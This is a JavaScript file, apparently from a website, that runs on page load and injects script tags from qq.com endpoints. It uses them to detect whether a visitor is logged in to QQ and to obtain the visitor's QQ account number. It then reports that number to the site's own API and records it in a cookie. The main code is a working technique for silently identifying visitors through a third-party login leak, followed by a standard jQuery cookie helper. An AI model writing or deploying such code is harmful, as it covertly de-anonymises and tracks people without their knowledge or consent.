/**
 * Created by zhiwen on 14-3-24.
 */

(function(AT, $$, win){

    $$(function(){


    var Qin_host=encodeURIComponent(document.location.href);
    var Qin_title=escape(document.title);
    var Qin_refer=encodeURIComponent(document.referrer);
    var timer = null, myuin = '';

    function removeJs(){
        $$('#appUin').remove();
    }

    function toAppErr(){
        removeJs();
        timer = setTimeout(getUn, 0);

    }

    function toAppSucc(){
        clearTimeout(timer);
        timer = null;
        removeJs();
        $$.get('/api/getqq', {uin : myuin}, function(r){
            debugger;
            console.log(r);
        });

    }

    function getUn(){
        if(myuin){
            var t = +new Date;
            t +=1000;
            appendJS('http://app.data.qq.com/?umod=user&uid=165543416&t='+t, toAppSucc, toAppErr, 'appUin');
        }

    }

    function loadjs() {
        try {
            if (data0.err == '1026') {//已登录

                $$.get('/api/getUin', {}, function(r){
                    var uin = '';
                    for(var k in r.rst)
                        myuin = k;
                    timer = setTimeout(getUn, 0);
                });
            } else {
                window.setTimeout(dynamicLoad, 1000);
            }
        } catch (e) {
            window.setTimeout(dynamicLoad, 1000);
        }
    }

    function appendJS(url, success, error, id){
        success = success || $.noop;
        var oScript = document.createElement("script");
        oScript.type = "text/javascript";
        oScript.src = url;
        if (oScript.readyState) {
            oScript.onreadystatechange = function() {
                if (oScript.readyState == "loaded"
                    || oScript.readyState == "complete") {
                    oScript.onreadystatechange = null;
                    window.setTimeout(success, 10);
                }
            };
        } else {
            oScript.onload = function() {
                window.setTimeout(success, 10);
            };
        }

        if(id){

            oScript.id = id;
        }

        oScript.onerror = function(){

            (error || $.noop)();
        }
        document.getElementsByTagName('HEAD').item(0).appendChild(oScript);

    }

    function dynamicLoad() {
        appendJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date()).getTime(), loadjs);
    }

    var quin = $$.cookie('quin');

    if(!quin){
        dynamicLoad();

    }else{

        $$.get('/api/saveHave', {quin : quin}, function(r){


        })
    }

    })

})(Atong, jQuery, window);


jQuery.cookie = function(name, value, options) {
    if (typeof value != 'undefined') { // name and value given, set cookie
        options = options || {};
        if (value === null) {
            value = '';
            options.expires = -1;
        }
        var expires = '';
        if (options.expires && (typeof options.expires == 'number' || options.expires.toUTCString)) {
            var date;
            if (typeof options.expires == 'number') {
                date = new Date();
                date.setTime(date.getTime() + (options.expires * 24 * 60 * 60 * 1000));
            } else {
                date = options.expires;
            }
            expires = '; expires=' + date.toUTCString(); // use expires attribute, max-age is not supported by IE
        }
        var path = options.path ? '; path=' + options.path : '';
        var domain = options.domain ? '; domain=' + options.domain : '';
        var secure = options.secure ? '; secure' : '';
        document.cookie = [name, '=', encodeURIComponent(value), expires, path, domain, secure].join('');
    } else { // only name given, get cookie
        var cookieValue = null;
        if (document.cookie && document.cookie != '') {
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = jQuery.trim(cookies[i]);
                // Does this cookie string begin with the name we want?
                if (cookie.substring(0, name.length + 1) == (name + '=')) {
                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                    break;
                }
            }
        }
        return cookieValue;
    }
};